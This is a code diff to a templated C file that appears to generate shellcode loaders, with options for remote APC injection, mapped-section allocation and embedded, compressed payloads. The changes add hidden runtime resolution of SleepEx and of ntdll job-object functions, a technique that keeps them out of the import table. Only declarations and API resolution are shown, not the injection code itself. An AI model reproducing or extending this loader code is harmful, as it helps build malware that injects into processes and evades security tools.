@@ -21,6 +21,7 @@ typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTE
 typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
 typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef VOID (WINAPI* pRtlZeroMemory)(PVOID, SIZE_T);
+typedef DWORD (WINAPI *pSleepEx)(DWORD, BOOL);
 {% if execution_method == 'remoteapc' %}
 typedef int (WINAPI* pLstrlenA)(LPCSTR);
 typedef DWORD (WINAPI* pGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
@@ -31,6 +32,9 @@ typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
 typedef DWORD (WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
 typedef DWORD (WINAPI* pResumeThread)(HANDLE);
 typedef DWORD (WINAPI* pGetLastError)(VOID);
+typedef NTSTATUS (WINAPI *pNtCreateJobObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
+typedef NTSTATUS (WINAPI *pNtSetInformationJobObject)(HANDLE, JOBOBJECTINFOCLASS, PVOID, ULONG);
+typedef NTSTATUS (WINAPI *pNtAssignProcessToJobObject)(HANDLE, HANDLE);
 {% endif %}
 {% if data_source == 'embedded' %}
 typedef HRSRC (WINAPI* pFindResourceA)(HMODULE, LPCSTR, LPCSTR);
@@ -73,6 +77,7 @@ pCreateFileA pfnCreateFileA;
 pGetFileSize pfnGetFileSize;
 pReadFile pfnReadFile;
 pRtlZeroMemory pfnRtlZeroMemory;
+pSleepEx pfnSleepEx;
 {% if execution_method == 'remoteapc' %}
 pLstrlenA pfnLstrlenA;
 pGetEnvironmentVariableA pfnGetEnvironmentVariableA;
@@ -83,6 +88,9 @@ pVirtualProtectEx pfnVirtualProtectEx;
 pQueueUserAPC pfnQueueUserAPC;
 pResumeThread pfnResumeThread;
 pGetLastError pfnGetLastError;
+pNtCreateJobObject pfnNtCreateJobObject;
+pNtSetInformationJobObject pfnNtSetInformationJobObject; 
+pNtAssignProcessToJobObject pfnNtAssignProcessToJobObject;
 {% endif %}
 {% if data_source == 'embedded' %}
 pFindResourceA pfnFindResourceA;
@@ -124,6 +132,7 @@ void ResolveAPIs() {
     pfnCreateFileA = (pCreateFileA)pfnGetProcAddress(hKernel32, "CreateFileA");
     pfnGetFileSize = (pGetFileSize)pfnGetProcAddress(hKernel32, "GetFileSize");
     pfnReadFile = (pReadFile)pfnGetProcAddress(hKernel32, "ReadFile");
+    pfnSleepEx = (pSleepEx)pfnGetProcAddress(hKernel32, "SleepEx");
 
     {% if execution_method == 'remoteapc' %}
     pfnLstrlenA = (pLstrlenA)pfnGetProcAddress(hKernel32, "lstrlenA");
@@ -152,6 +161,9 @@ void ResolveAPIs() {
     {% if execution_method == 'remoteapc' or allocation_method == 'mappedsection' %}
     pfnNtCreateSection = (pNtCreateSection)pfnGetProcAddress(hNtdll, "NtCreateSection");
     pfnNtMapViewOfSection = (pNtMapViewOfSection)pfnGetProcAddress(hNtdll, "NtMapViewOfSection");
+    pfnNtCreateJobObject = (pNtCreateJobObject)pfnGetProcAddress(hNtdll, "NtCreateJobObject");
+    pfnNtSetInformationJobObject = (pNtSetInformationJobObject)pfnGetProcAddress(hNtdll, "NtSetInformationJobObject");
+    pfnNtAssignProcessToJobObject = (pNtAssignProcessToJobObject)pfnGetProcAddress(hNtdll, "NtAssignProcessToJobObject");
     {% endif %}
 
     {% if bytecode_compression == 'mszip_compressor' %}
